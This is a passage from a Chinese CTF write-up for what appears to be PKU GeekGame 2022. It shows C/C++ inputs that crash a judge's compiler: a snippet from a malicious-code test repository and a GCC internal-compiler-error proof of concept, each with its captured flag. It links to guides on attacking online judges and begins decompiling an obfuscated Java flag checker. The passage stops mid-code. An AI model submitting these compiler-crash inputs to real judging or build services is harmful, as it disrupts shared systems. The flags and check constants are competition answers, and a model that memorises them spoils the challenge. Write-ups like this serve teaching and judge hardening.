<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">x</span> <span class="token keyword">struct</span> <span class="token class-name">z</span><span class="token operator">&lt;</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span><span class="token function">x</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span><span class="token function">x</span><span class="token punctuation">(</span>y<span class="token operator">&gt;</span><span class="token operator">&lt;</span>y<span class="token operator">*</span><span class="token punctuation">,</span><span class="token function">x</span><span class="token punctuation">(</span>y<span class="token operator">*</span>w<span class="token operator">&gt;</span>v<span class="token operator">&lt;</span>y<span class="token operator">*</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>x<span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token comment">//EOF</span>

Compiling your code<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
flag<span class="token punctuation">{</span>Short <span class="token keyword">volatile</span> prOgram<span class="token punctuation">;</span> <span class="token keyword">long</span> lonG mEssage<span class="token punctuation">;</span><span class="token punctuation">}</span>

See you later<span class="token operator">~</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看起来本意是想用 volatile 啊（（</p>
<p>代码来自 <a target="_blank" rel="noopener" href="https://github.com/vijos/malicious-code">https://github.com/vijos/malicious-code</a> ，说来这个 GitHub repo 挺有意思的，用来测试 OJ 挺好的（x</p>
<h4 id="玩挺花"><a href="#玩挺花" class="headerlink" title="玩挺花"></a>玩挺花</h4><blockquote>
<p><strong>第二阶段提示：</strong></p>
<ul>
<li>前两个问题是开发 OJ 系统需要考虑的。PoC 很容易在网上搜索到。</li>
<li>第三问考的是 GCC 的 bug（internal compiler error）。可以参考一下 GCC 的 bug tracker。</li>
</ul>
</blockquote>
<p>查到了这个 </p>
<p><a target="_blank" rel="noopener" href="https://gcc.gnu.org/bugzilla/show_bug.cgi?id=102434"><strong>Bug 102434</strong></a> - [11/12 Regression] ICE in output_constructor_regular_field, at varasm.c:5514 since <a target="_blank" rel="noopener" href="https://gcc.gnu.org/git/gitweb.cgi?p=gcc.git;h=6fb7e3c29188ab7c">r11-4547-g6fb7e3c29188ab7c</a>     </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">using <span class="token class-name">size_t</span> <span class="token operator">=</span> <span class="token function">decltype</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
namespace std <span class="token punctuation">{</span>
  template<span class="token operator">&lt;</span>typename T<span class="token operator">&gt;</span> <span class="token keyword">union</span> initializer_list <span class="token punctuation">{</span>
    <span class="token keyword">const</span> T <span class="token operator">*</span>ptr<span class="token punctuation">;</span>
    <span class="token class-name">size_t</span> n<span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
template<span class="token operator">&lt;</span>typename T<span class="token operator">&gt;</span>
<span class="token keyword">void</span> <span class="token function">Task</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token keyword">auto</span> b <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token operator">&amp;</span>Task<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token comment">//EOF</span>

Compiling your code<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
flag<span class="token punctuation">{</span>Sorry<span class="token operator">-</span>to<span class="token operator">-</span>inform<span class="token operator">-</span>you<span class="token operator">-</span>that<span class="token operator">-</span>Gnu<span class="token operator">-</span>is<span class="token operator">-</span>NOt<span class="token operator">-</span>unix<span class="token punctuation">}</span>

See you later<span class="token operator">~</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<blockquote>
<p>顺便，还发现了龙芯也有人提了类似的问题，然后被 upstream 分支修复了，乐</p>
<p><a target="_blank" rel="noopener" href="https://github.com/loongson/gcc/issues/77">gcc 编译器问题 internal compiler error: in output_constructor_regular_field, at varasm.c:5512</a></p>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/34392034">最短的可以造成崩溃且编译器无法优化掉的 C++ 代码是什么？</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/58580702">让编译器崩溃的57段C语言代码，你试过吗？</a></p>
<p><a target="_blank" rel="noopener" href="https://strcpy.me/index.php/archives/652/">OnlineJudge 沙箱实现思路</a></p>
<p><a target="_blank" rel="noopener" href="https://webcache.googleusercontent.com/search?q=cache:zQ6PT_r8BNcJ:https://www.happyhacking.top/2019/11/21/attack-oj/&amp;cd=13&amp;hl=zh-CN&amp;ct=clnk&amp;gl=hk&amp;lr=lang_en%7Clang_zh-CN&amp;client=firefox-b-d">对acm评测机的简单测试</a></p>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/23067497">Online Judge 是如何解决判题端安全性问题的？</a></p>
<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/67138068">有什么卡OJ评测机的方法？</a></p>
<p><a target="_blank" rel="noopener" href="https://meik2333.com/posts/judger4/">如何写一个评测姬 - 第四篇</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/coded-ream/p/7207916.html">在线判题系统hustoj的搭建</a></p>
</blockquote>
<h3 id="Flag-Checker"><a href="#Flag-Checker" class="headerlink" title="Flag Checker"></a>Flag Checker</h3><blockquote>
<p>我们发现，有很多选手在比赛中提交了错误的 Flag。</p>
<p>为了防止这种情况发生，给选手良好的参赛体验，这里有一个简单的 Java 程序。</p>
<p>你可以在程序里面输入要提交 Flag ，程序会帮你检查 Flag 是否正确。</p>
<p>是不是非常的贴心呢？</p>
<p><strong>提醒：JRE 版本高于 15 时可能无法运行此程序。建议使用 JRE 8 运行。</strong></p>
<p>你可以 <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob15/prob15.jar">下载题目附件</a></p>
</blockquote>
<h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag 1"></a>Flag 1</h4><p>给了个 .jar</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124031214576.png"></p>
<p>瞄了眼只有个 GeekGame 类，直接拖进 jadx</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221124031303080.png"></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">defpackage</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Button</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Component</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Frame</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">Label</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span></span><span class="token class-name">TextField</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">ActionEvent</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">ActionListener</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">WindowAdapter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>awt<span class="token punctuation">.</span>event<span class="token punctuation">.</span></span><span class="token class-name">WindowEvent</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">StringWriter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span><span class="token class-name">Invocable</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span><span class="token class-name">ScriptEngineManager</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">BoxLayout</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token class-name">JOptionPane</span></span><span class="token punctuation">;</span>

<span class="token comment">/* renamed from: GeekGame  reason: default package */</span>
<span class="token comment">/* loaded from: prob15.jar:GeekGame.class */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GeekGame</span> <span class="token keyword">extends</span> <span class="token class-name">Frame</span> <span class="token keyword">implements</span> <span class="token class-name">ActionListener</span> <span class="token punctuation">{</span>
    <span class="token class-name">TextField</span> textField1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TextField</span><span class="token punctuation">(</span><span class="token string">"flag{...}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Button</span> button1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Check Flag 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Button</span> button2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Button</span><span class="token punctuation">(</span><span class="token string">"Check Flag 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">Invocable</span> invocable<span class="token punctuation">;</span>

    <span class="token class-name">GeekGame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">setSize</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setVisible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setLayout</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BoxLayout</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Label</span> label <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Label</span><span class="token punctuation">(</span><span class="token string">"Flag: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>button1<span class="token punctuation">.</span><span class="token function">addActionListener</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>button2<span class="token punctuation">.</span><span class="token function">addActionListener</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">add</span><span class="token punctuation">(</span>label<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>textField1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>button1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>button2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Invocable</span> engineByName <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ScriptEngineManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"nashorn"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token string">"\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ï\u008c\u0087\u008a\u008c\u0084\u0089\u0083\u008e\u0088ÝÇ°ß\u0097\u008e×Ü\u008a\u0097ÝÆ\u0094\u0099\u008e\u009dÏ°ß\u0097ØÝÛ\u008dÒ´È\u008c\u0087\u008e\u009d¬\u0080\u008b\u008a®\u009bÈÃÈ\u0082\u008e\u009fÈÃÈÈÃÈ\u009c\u009f\u0083\u0086\u009bÈÃÈ\u009c\u009b\u009d\u0086\u0081\u0088\u0086\u0089\u0096ÈÃÈ¬\u0080\u009d\u009d\u008a\u008c\u009bÈÃÈ¸\u009d\u0080\u0081\u0088ÈÃÈ\u0085ÂÈ²Ô\u009d\u008a\u009b\u009a\u009d\u0081ÏÇ¥¼ ¡´°ß\u0097ØÝÛ\u008d´Û²²Ç°ß\u0097\u008e×Ü\u008a\u0097Ý´°ß\u0097ØÝÛ\u008d´Ü²²Ç°ß\u0097ØÝÛ\u008d´Ý²Æ´°ß\u0097ØÝÛ\u008d´Þ²²Ç\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ç°ß\u0097\u008e×Ü\u008a\u0097ÜÆ\u0094\u009d\u008a\u009b\u009a\u009d\u0081Ï°ß\u0097\u008e×Ü\u008a\u0097Ü´°ß\u0097ØÝÛ\u008d´ß²²ÇßÆ\u0092ÆÆÒÒÏ¥¼ ¡´°ß\u0097ØÝÛ\u008d´Û²²Ç´ßÃÞÚÃÞÙÃÞØÃÜßÃÞßÚÃÞÙÃÜÞÃÞÙÃÙØÃÜÃÜÜÃÚÃÙßÃÛÃÞßÙÃÙÃÛÞÃßÃÞÃÙØÃÜÃÞÙÃÛÃÙÃÜÜÃÝÜÝ²´°ß\u0097ØÝÛ\u008d´Þ²²Ç\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ç°ß\u0097\u008e×Ü\u008a\u0097ÜÆ\u0094\u009d\u008a\u009b\u009a\u009d\u0081ÏÇ\u008c\u0087\u008a\u008c\u0084\u0089\u0083\u008e\u0088ÝÄÏ°ß\u0097ØÝÛ\u008d´Ý²Æ´°ß\u0097ØÝÛ\u008d´ß²²Ç°ß\u0097\u008e×Ü\u008a\u0097ÜÆ\u0092ÆÆÐ°ß\u0097ØÝÛ\u008d´Ú²Õ°ß\u0097ØÝÛ\u008d´Ù²Æ\u0092"</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token string">"\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ï\u008c\u0087\u008a\u008c\u0084\u0089\u0083\u008e\u0088ÝÇ°ß\u0097\u008e×Ü\u008a\u0097ÝÆ\u0094\u0099\u008e\u009dÏ°ß\u0097ØÝÛ\u008dÒ´È\u008c\u0087\u008e\u009d¬\u0080\u008b\u008a®\u009bÈÃÈ\u0082\u008e\u009fÈÃÈÈÃÈ\u009c\u009f\u0083\u0086\u009bÈÃÈ\u009c\u009b\u009d\u0086\u0081\u0088\u0086\u0089\u0096ÈÃÈ¬\u0080\u009d\u009d\u008a\u008c\u009bÈÃÈ¸\u009d\u0080\u0081\u0088ÈÃÈ\u0085ÂÈ²Ô\u009d\u008a\u009b\u009a\u009d\u0081ÏÇ¥¼ ¡´°ß\u0097ØÝÛ\u008d´Û²²Ç°ß\u0097\u008e×Ü\u008a\u0097Ý´°ß\u0097ØÝÛ\u008d´Ü²²Ç°ß\u0097ØÝÛ\u008d´Ý²Æ´°ß\u0097ØÝÛ\u008d´Þ²²Ç\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ç°ß\u0097\u008e×Ü\u008a\u0097ÜÆ\u0094\u009d\u008a\u009b\u009a\u009d\u0081Ï°ß\u0097\u008e×Ü\u008a\u0097Ü´°ß\u0097ØÝÛ\u008d´ß²²ÇßÆ\u0092ÆÆÒÒÏ¥¼ ¡´°ß\u0097ØÝÛ\u008d´Û²²Ç´ßÃÞÚÃÞÙÃÞØÃÜßÃÞßÚÃÞÙÃÜÞÃÞÙÃÙØÃÜÃÜÜÃÚÃÙßÃÛÃÞßÙÃÙÃÛÞÃßÃÞÃÙØÃÜÃÞÙÃÛÃÙÃÜÜÃÝÜÝ²´°ß\u0097ØÝÛ\u008d´Þ²²Ç\u0089\u009a\u0081\u008c\u009b\u0086\u0080\u0081Ç°ß\u0097\u008e×Ü\u008a\u0097ÜÆ\u0094\u009d\u008a\u009b\u009a\u009d\u0081ÏÇ\u008c\u0087\u008a\u008c\u0084\u0089\u0083\u008e\u0088ÝÄÏ°ß\u0097ØÝÛ\u008d´Ý²Æ´°ß\u0097ØÝÛ\u008d´ß²²Ç°ß\u0097\u008e×Ü\u008a\u0097ÜÆ\u0092ÆÆÐ°ß\u0097ØÝÛ\u008d´Ú²Õ°ß\u0097ØÝÛ\u008d´Ù²Æ\u0092"</span><span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">239</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            engineByName<span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">StringWriter</span> stringWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span>stringWriter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span> <span class="token keyword">null</span><span class="token punctuation">,</span> stringWriter<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>invocable <span class="token operator">=</span> engineByName<span class="token punctuation">;</span>
        <span class="token function">addWindowListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WindowAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// from class: GeekGame.1</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">windowClosing</span><span class="token punctuation">(</span><span class="token class-name">WindowEvent</span> windowEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">actionPerformed</span><span class="token punctuation">(</span><span class="token class-name">ActionEvent</span> actionEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>actionEvent<span class="token punctuation">.</span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>button1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"MzkuM8gmZJ6jZJHgnaMuqy4lMKM4"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token function">rot13</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>textField1<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"Correct"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"Wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>invocable<span class="token punctuation">.</span><span class="token function">invokeFunction</span><span class="token punctuation">(</span>actionEvent<span class="token punctuation">.</span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">.</span>button2 <span class="token operator">?</span> <span class="token string">"checkflag2"</span> <span class="token operator">:</span> <span class="token string">"checkflag3"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>textField1<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">StringWriter</span> stringWriter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringWriter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PrintWriter</span><span class="token punctuation">(</span>stringWriter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">JOptionPane</span><span class="token punctuation">.</span><span class="token function">showMessageDialog</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Component</span><span class="token punctuation">)</span> <span class="token keyword">null</span><span class="token punctuation">,</span> stringWriter<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">rot13</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">char</span> charAt <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>charAt <span class="token operator">&gt;=</span> <span class="token char">'a'</span> <span class="token operator">&amp;&amp;</span> charAt <span class="token operator">&lt;=</span> <span class="token char">'m'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                charAt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>charAt <span class="token operator">+</span> <span class="token char">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>charAt <span class="token operator">&gt;=</span> <span class="token char">'A'</span> <span class="token operator">&amp;&amp;</span> charAt <span class="token operator">&lt;=</span> <span class="token char">'M'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                charAt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>charAt <span class="token operator">+</span> <span class="token char">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>charAt <span class="token operator">&gt;=</span> <span class="token char">'n'</span> <span class="token operator">&amp;&amp;</span> charAt <span class="token operator">&lt;=</span> <span class="token char">'z'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                charAt <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>charAt <span class="token operator">-</span> <span class="token char">'\r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>charAt <span class="token operator">&gt;=</span> <span class="token char">'N'</span> <span class="token operator">&amp;&amp;</span> charAt <span class="token operator">&lt;=</span> <span class="token char">'Z'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
